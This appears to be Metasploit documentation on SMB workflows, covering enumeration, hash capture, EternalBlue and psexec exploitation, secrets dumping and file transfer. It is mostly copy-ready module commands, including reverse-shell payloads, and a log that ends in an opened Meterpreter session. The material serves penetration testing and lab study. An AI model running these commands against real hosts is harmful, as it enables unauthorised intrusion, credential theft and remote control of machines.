## SMB Workflows

SMB (Server Message Blocks), is a way for sharing files across nodes on a network.

There are two main ports for SMB:

- 139/TCP - Initially Microsoft implemented SMB on top of their existing NetBIOS network architecture, which allowed for Windows computers to communicate across the same network
- 445/TCP - Newer versions of SMB use this port, were NetBIOS is not used.

Other terminology to be aware of:
- SMB - Serer Message Blocks
- CIFS - Common Internet File System
- Samba - A free software re-implementation of SMB, which is frequently found on unix-like systems

Metasploit has support for multiple SMB modules, including:

- Version enumeration
- Verifying/bruteforcing credentials
- Capture modules
- Relay modules
- File transfer
- Exploit modules

There are more modules than listed here, for the full list of modules run the `search` command within msfconsole:

```msf
msf6 > search smb
```

### Lab Environment

When testing in a lab environment - SMB can be used on a Window's host machine, or within Docker.

For instance running Samba on Ubuntu 16.04:

```bash
docker run -it --rm --publish 127.0.0.1:139:139 --publish 127.0.0.1:445:445 ubuntu:16.04 /bin/bash
mkdir -p /tmp/foo
apt update
apt install -y samba
```

Verifying version is as expected:
```
$ samba --version
Version 4.3.11-Ubuntu
```

Configuring the share:
```bash
cat << EOF >> /etc/samba/smb.conf
[foo_share]
    comment = Foo samba share
    path = /tmp/foo
    read only = no
    browsable = yes
EOF
```

Restart the service:

```
service smbd restart
```

### SMB Enumeration

Enumerate SMB version:

```
use auxiliary/scanner/smb/smb_version
run smb://10.10.10.161
```

Enumerate shares:

```
use auxiliary/scanner/smb/smb_enumshares
run smb://10.10.10.161
run smb://user:pass@10.10.10.161
run 'smb://domain;user with spaces:pass@192.168.123.4' SMB::AlwaysEncrypt=false SMB::ProtocolVersion=1
```

Enumerate shares and show all files recursively:

```
use auxiliary/scanner/smb/smb_enumshares
run 'smb://user:pass with a space@10.10.10.161' showfiles=true spidershares=true
```

Enumerate users:

```
use auxiliary/scanner/smb/smb_enumusers
run smb://user:p4$$w0rd@192.168.123.13
```

[Enumerate gpp files](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/smb/smb_enum_gpp.md) in a SMB share:

```
use auxiliary/scanner/smb/smb_enum_gpp
run smb://192.168.123.13/share_name verbose=true store=true
run smb://user:p4$$w0rd@192.168.123.13/share_name verbose=true store=true
```

### SMB Server

Create a mock SMB server which accepts credentials before returning `NT_STATUS_LOGON_FAILURE`. These hashes can then be cracked later:

```
use auxiliary/server/capture/smb
run
```

### SMB MS17-010

Metasploit has a module for MS17-010, dubbed Eternal Blue, which has the capability to target Windows 7, Windows 8.1, Windows 2012 R2, and Windows 10.

Checking for exploitability:

```
use auxiliary/scanner/smb/smb_ms17_010
check 10.10.10.23
check 10.10.10.0/24
check smb://user:pass@10.10.10.1/
check smb://domain;user:pass@10.10.10.1/
check cidr:/24:smb://user:pass@10.10.10.0 threads=32
```

As of 2021, Metasploit supports a single exploit module for which has the capability to target Windows 7, Windows 8.1, Windows 2012 R2, and Windows 10, full details within the [Metasploit Wrapup](https://www.rapid7.com/blog/post/2021/07/16/metasploit-wrap-up-121/):

```
use exploit/windows/smb/ms17_010_eternalblue
run 10.10.10.23 lhost=192.168.123.1
run 10.10.10.0/24 lhost=192.168.123.1 lport=5000
run smb://user:pass@10.10.10.1/ lhost=192.168.123.1
run smb://domain;user:pass@10.10.10.1/ lhost=192.168.123.1
```

### SMB psexec

Running psexec against a remote host with credentials:

```
use exploit/windows/smb/psexec
run smb://user:pass8@192.168.123.13 lhost=192.168.123.1 lport=5000
```

Running psexec with NTLM hashes:

```
use exploit/windows/smb/psexec
run smb://Administrator:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6@10.10.10.161 lhost=10.10.14.13 lport=5000
```

### SMB Dumping

Dumping secrets with credentials:

```
use auxiliary/gather/windows_secrets_dump
run smb://user:pass@192.168.123.6
```

Dumping secrets with NTLM hashes

```
use auxiliary/gather/windows_secrets_dump
run smb://Administrator:aad3b435b51404eeaad3b435b51404ee:15feae27e637cb98ffacdf0a840eeb4b@192.168.123.1
```

### SMB Files

Download a file:

```
use auxiliary/admin/smb/download_file
run smb://a:p4$$w0rd@192.168.123.13/my_share/helloworld.txt
```

Upload a file:

```
use auxiliary/admin/smb/upload_file
echo "my file" > local_file.txt
run smb://a:p4$$w0rd@192.168.123.13/my_share/remote_file.txt lpath=./local_file.txt
```

### Kerberos Authentication

Details on the Kerberos specific option names are documented in [[Kerberos Service Authentication|kerberos/service_authentication]]

Running psexec against a host:

```msf
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd smb::auth=kerberos domaincontrollerrhost=192.168.123.13 smb::rhostname=dc3.demo.local domain=demo.local

[*] Started reverse TCP handler on 192.168.123.1:4444
[*] 192.168.123.13:445 - Connecting to the server...
[*] 192.168.123.13:445 - Authenticating to 192.168.123.13:445|demo.local as user 'Administrator'...
[+] 192.168.123.13:445 - 192.168.123.13:88 - Received a valid TGT-Response
[*] 192.168.123.13:445 - 192.168.123.13:445 - TGT MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120911_default_192.168.123.13_mit.kerberos.cca_474531.bin
[+] 192.168.123.13:445 - 192.168.123.13:88 - Received a valid TGS-Response
[*] 192.168.123.13:445 - 192.168.123.13:445 - TGS MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120911_default_192.168.123.13_mit.kerberos.cca_169149.bin
[+] 192.168.123.13:445 - 192.168.123.13:88 - Received a valid delegation TGS-Response
[*] 192.168.123.13:445 - Selecting PowerShell target
[*] 192.168.123.13:445 - Executing the payload...
[+] 192.168.123.13:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 192.168.123.13
[*] Meterpreter session 6 opened (192.168.123.1:4444 -> 192.168.123.13:49738) at 2023-01-18 12:09:13 +0000

meterpreter >
```
